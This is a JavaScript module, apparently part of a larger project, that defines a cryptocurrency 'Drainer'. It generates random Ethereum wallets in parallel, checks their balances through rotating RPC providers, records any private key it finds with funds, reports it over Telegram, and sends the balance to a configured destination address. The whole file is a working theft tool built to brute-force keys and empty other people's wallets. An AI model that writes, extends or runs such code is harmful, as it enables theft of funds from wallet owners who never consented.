'use strict';

const { ethers }  = require('ethers');
const cfg         = require('./utils/config');
const tg          = require('./utils/telegram');
const {
  logHistory, logSuccess, saveWallet,
  saveStats, saveSession, loadSession,
  printStats,
} = require('./utils/logger');

const ZERO      = ethers.constants.Zero;
const GAS_LIMIT = cfg.gasLimit;

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

// ── Round-robin provider pool (lebih andal dari FallbackProvider) ─────────────
function buildProviderPool() {
  const urls = Array.isArray(cfg.providerURL) ? cfg.providerURL : [cfg.providerURL];
  return urls.map((url) => new ethers.providers.JsonRpcProvider(url));
}

class Drainer {
  constructor() {
    this.dest          = cfg.destinationAddress;
    this.providers     = buildProviderPool();
    this.providerIndex = 0;
    this.concurrency   = cfg.concurrency;
    this.maxAttempts   = cfg.maxAttempts;
    this._stopped      = false;
    this._startTime    = Date.now();
    this._rpcErrors    = 0;

    const session      = loadSession();
    this.totalCount    = session ? session.totalCount   : 0;
    this.successCount  = session ? session.successCount : 0;

    if (session) {
      process.stdout.write(`\x1b[33m[Resume] Melanjutkan dari attempt #${this.totalCount}\x1b[0m\n`);
    }
  }

  // Ambil provider berikutnya secara round-robin
  _nextProvider() {
    const p = this.providers[this.providerIndex % this.providers.length];
    this.providerIndex++;
    return p;
  }

  _elapsed() {
    return Date.now() - this._startTime;
  }

  _rate() {
    const secs = this._elapsed() / 1000 || 1;
    return (this.totalCount / secs).toFixed(1);
  }

  _snapshot() {
    return {
      totalCount:   this.totalCount,
      successCount: this.successCount,
      rpcErrors:    this._rpcErrors,
      ratePerSec:   this._rate(),
      uptimeMs:     this._elapsed(),
      timestamp:    new Date().toISOString(),
    };
  }

  stop() {
    this._stopped = true;
    saveSession({ totalCount: this.totalCount, successCount: this.successCount });
    saveStats(this._snapshot());
    tg.notifyStopped(this.totalCount, this.successCount);
  }

  async _getBalance(wallet) {
    for (let i = 0; i < cfg.retryLimit; i++) {
      try {
        return await wallet.getBalance();
      } catch (err) {
        this._rpcErrors++;
        if (i < cfg.retryLimit - 1) {
          // Ganti provider saat retry
          wallet = wallet.connect(this._nextProvider());
          await sleep(cfg.retryDelay * (i + 1));
        }
      }
    }
    return null;
  }

  async attemptToDrain() {
    if (this._stopped) return;

    // Cek batas maxAttempts
    if (this.maxAttempts > 0 && this.totalCount >= this.maxAttempts) {
      this._stopped = true;
      process.stdout.write(`\n\x1b[33m[Draino] maxAttempts (${this.maxAttempts}) tercapai.\x1b[0m\n`);
      this.stop();
      process.exit(0);
    }

    // Generate wallet baru, assign ke provider round-robin
    const provider   = this._nextProvider();
    let   wallet     = ethers.Wallet.createRandom().connect(provider);
    const address    = wallet.address;
    const privateKey = wallet.privateKey;

    // Hitung attempt SEBELUM cek balance agar counter selalu naik
    this.totalCount++;

    const balance = await this._getBalance(wallet);

    // Jika semua retry gagal, skip dan lanjut
    if (balance === null) {
      logHistory(`${this.totalCount} | ${address} | RPC_ERROR`);
      return;
    }

    const balanceEth = ethers.utils.formatEther(balance);
    logHistory(`${this.totalCount} | ${address} | ${balanceEth} ETH`);

    if (balance.gt(ZERO)) {
      this.successCount++;

      const walletData = {
        attempt:   this.totalCount,
        address,
        privateKey,
        balance:   balanceEth,
        network:   'sepolia',
        timestamp: new Date().toISOString(),
      };

      saveWallet(walletData);
      tg.notifyWalletFound(walletData);
      logSuccess(`Wallet #${this.successCount} | ${address} | ${balanceEth} ETH`);

      try {
        const gasPrice = await provider.getGasPrice();
        const gasCost  = gasPrice.mul(GAS_LIMIT);
        const netValue = balance.sub(gasCost);

        if (netValue.gt(ZERO)) {
          const tx = await wallet.sendTransaction({
            to:       this.dest,
            value:    netValue,
            gasLimit: GAS_LIMIT,
            gasPrice,
          });
          logSuccess(`TX Hash: ${tx.hash}`);
          tg.notifyTxSent(tx.hash);
          await tx.wait(1);
          logSuccess(`TX Confirmed: ${tx.hash}`);
        } else {
          logSuccess(`Saldo tidak cukup untuk gas — wallet disimpan, TX dilewati.`);
        }
      } catch (err) {
        logSuccess(`TX gagal: ${err.message}`);
      }
    }
  }

  async _worker() {
    while (!this._stopped) {
      await this.attemptToDrain();
    }
  }

  _startStatsLoop() {
    setInterval(() => {
      if (this._stopped) return;
      const snap = this._snapshot();
      printStats(snap.totalCount, snap.successCount, snap.ratePerSec, snap.uptimeMs, snap.rpcErrors);
      saveStats(snap);
      saveSession({ totalCount: this.totalCount, successCount: this.successCount });
    }, cfg.statsInterval);
  }

  async run() {
    tg.notifyStarted(this.concurrency);
    this._startStatsLoop();
    const workers = Array.from({ length: this.concurrency }, () => this._worker());
    await Promise.all(workers);
  }
}

module.exports = new Drainer();
